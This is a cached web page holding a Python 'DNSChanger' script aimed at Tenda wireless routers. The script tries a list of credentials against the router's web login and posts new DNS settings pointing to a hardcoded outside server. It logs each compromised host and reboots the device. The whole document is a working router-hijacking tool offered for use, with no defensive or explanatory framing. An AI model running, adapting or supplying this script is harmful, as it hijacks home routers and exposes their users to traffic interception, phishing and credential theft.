
<!-- saved from url=(0175)http://webcache.googleusercontent.com/search?q=cache:L0kyKYIrPyoJ:goldenkash.com/application/class/routers_py/router.TENDAWirelessNBroadbandrouter.py+&cd=6&hl=en&ct=clnk&gl=us -->
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><!--<base href="http://goldenkash.com/application/class/routers_py/router.TENDAWirelessNBroadbandrouter.py">--><base href="."><style>body{margin-left:0;margin-right:0;margin-top:0}#bN015htcoyT__google-cache-hdr{background:#f5f5f5;font:13px arial,sans-serif;text-align:left;color:#202020;border:0;margin:0;border-bottom:1px solid #cecece;line-height:16px;padding:16px 28px 24px 28px}#bN015htcoyT__google-cache-hdr *{display:inline;font:inherit;text-align:inherit;color:inherit;line-height:inherit;background:none;border:0;margin:0;padding:0;letter-spacing:0}#bN015htcoyT__google-cache-hdr a{text-decoration:none;color:#1a0dab}#bN015htcoyT__google-cache-hdr a:hover{text-decoration:underline}#bN015htcoyT__google-cache-hdr a:visited{color:#609}#bN015htcoyT__google-cache-hdr div{display:block;margin-top:4px}#bN015htcoyT__google-cache-hdr b{font-weight:bold;display:inline-block;direction:ltr}</style><style>pre{white-space:pre-wrap}</style></head><body><div id="bN015htcoyT__google-cache-hdr"><div><span>This is Google's cache of <a href="http://goldenkash.com/application/class/routers_py/router.TENDAWirelessNBroadbandrouter.py">http://goldenkash.com/application/class/routers_py/router.TENDAWirelessNBroadbandrouter.py</a>.</span>&nbsp;<span>It is a snapshot of the page as it appeared on Sep 16, 2018 13:43:53 GMT.</span>&nbsp;<span>The <a href="http://goldenkash.com/application/class/routers_py/router.TENDAWirelessNBroadbandrouter.py">current page</a> could have changed in the meantime.</span>&nbsp;<a href="http://support.google.com/websearch/bin/answer.py?hl=en&amp;p=cached&amp;answer=1687222"><span>Learn more</span>.</a></div><span style="display:inline-block;margin-top:8px;color:#717171"><span>Tip: To quickly find your search term on this page, press <b>Ctrl+F</b> or <b>⌘-F</b> (Mac) and use the find bar.</span></span></div><div style="position:relative; margin:8px;"><pre>#!/usr/bin/env python
# -*- coding: utf-8 -*-
import argparse, requests, base64, os

from scan import password
from bs4 import BeautifulSoup

parser = argparse.ArgumentParser(description='Script for DNSChanger by Ghost', prog='Ghost', formatter_class=lambda prog: argparse.HelpFormatter(prog, max_help_position=100,width=200))
parser.add_argument("-dns1", "--dns1", help = "Define o dns primário", metavar='', default='192.99.187.193', required=False)
parser.add_argument("-dns2", "--dns2", help = "Define o dns secundário", metavar='', default='8.8.4.4', required=False)
parser.add_argument("-host", "--host", help = "Define o ip e porta do router a ser executado", metavar='', default='a', required=False)

args = parser.parse_args()

dns1 = args.dns1
dns2 = args.dns2
host = args.host.replace("http://","")

router = requests.Session()

def stringToBase64(s):
    return base64.b64encode(s.encode('utf-8'))

for x in password.Credentials:
    login = router.get("http://"+x+"@"+host)
    if login.status_code == 200:

        header = {
            'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'Accept-Encoding':'gzip, deflate',
            'Accept-Language':'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
            'Authorization':'Basic '+stringToBase64(x),
            'Cache-Control':'max-age=0',
            'Connection':'keep-alive',
            'Content-Length':'72',
            'Content-Type':'application/x-www-form-urlencoded',
            'Host':host,
            'Origin':'http://'+host,
            'Referer':'http://'+host+'/wan_dns.asp',
            'Upgrade-Insecure-Requests':'1',
            'User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'
        }

        data = {
            'GO':'wan_dns.asp',
            'rebootTag':'',
            'DSEN':'1',
            'DNSEN':'on',
            'DS1':dns1,
            'DS2':dns2
        }

        try:
            changeDNS = router.post("http://"+host+"/goform/AdvSetDns", data=data, headers=header)
        except:
            pass

        try:
            testeDNs = router.get("http://"+host+"/wan_dns.asp")
            if dns1 in testeDNs:
                print("DNS inserido com sucesso")
                os.system("cd /var/www/html/logs;php gravar.php "+host)
        except:
            pass

        header = {
            'Referer':'http://'+host+'/system_reboot.asp',
            'User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'
        }

        try:
            reboot = router.get("http://"+host+"/goform/SysToolReboot", headers=header)
        except:
            pass

        break</pre></div></body></html>